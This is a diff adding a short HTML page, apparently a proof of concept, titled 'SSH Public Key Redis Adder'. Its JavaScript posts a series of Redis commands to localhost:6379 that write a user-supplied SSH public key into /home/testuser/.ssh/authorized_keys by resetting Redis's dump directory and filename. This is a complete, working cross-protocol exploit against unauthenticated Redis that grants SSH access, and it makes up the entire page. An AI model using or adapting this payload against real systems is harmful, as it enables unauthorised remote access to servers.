@@ -1,0 +1,31 @@
+<html>
+    <head>
+        <script   src="https://code.jquery.com/jquery-3.1.0.min.js"   integrity="sha256-cCueBR6CsyA4/9szpPfrX3s49M9vUU5BgtiJj06wt/s="   crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <h1>SSH Public Key Redis Adder</h1>
+        <input style="height:200px; width:600px; font-size:14pt;" type="text" id="sshKey" placeholder="Your ssh public key goes here"><br>
+        <button onclick="add_key()">Add your key!</button>
+        <script>
+            var add_key = function(){
+                var sshKey = document.getElementById("sshKey").value;
+                var payloads = [
+                    'config set dbfilename "backup.rdb"\n',
+                    'save\n',
+                    'echo flushall\n',
+                    'set crackit "\\n\\n\\n' + sshKey + '\\n\\n\\n"\n',
+                    'config set dir /home/testuser/.ssh/\n',
+                    'config set dbfilename "authorized_keys"\n',
+                    "save\n"
+                ]
+                for(var i=0; i<payloads.length; i++){
+                    (function(index){
+                        setTimeout(function(){
+                            jQuery.post("http://localhost:6379", payloads[index]);
+                        }, i * 100);
+                    })(i);
+                }
+            }
+        </script>
+    </body>
+</html>
